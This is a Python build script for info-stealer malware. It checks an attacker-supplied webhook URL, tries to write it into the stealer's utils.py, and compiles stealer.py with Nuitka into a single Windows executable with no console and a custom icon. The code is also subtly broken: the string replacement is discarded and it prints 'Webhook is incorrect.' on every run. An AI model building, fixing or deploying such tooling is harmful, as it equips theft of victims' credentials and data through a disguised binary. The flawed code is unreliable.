import copy
import os
import requests

cmd = "python -m nuitka --standalone --onefile --disable-console --windows-icon-from-ico=icon.ico stealer.py"

if __name__ == "__main__":
    with open("utils.py", "r") as file:
        utils = file.read()

    backup = copy.copy(utils)
    with open("webhook.txt", "r") as file:
        webhook = file.read()

    try:
        if requests.get(webhook).status_code == 200:
            # Open the file in write mode
            with open("my_file.txt", "w") as file:
                # Write the modified string to the file
                utils.replace("WEBHOOK_1", webhook)
                with open("utils.py", "w") as file_utils:
                    file_utils.write(utils)
                    os.system(cmd)
                with open("utils.py", "w") as file_utils:
                    file_utils.write(backup)
        print("Webhook is incorrect.")
    except Exception as e:
        print(str(e))
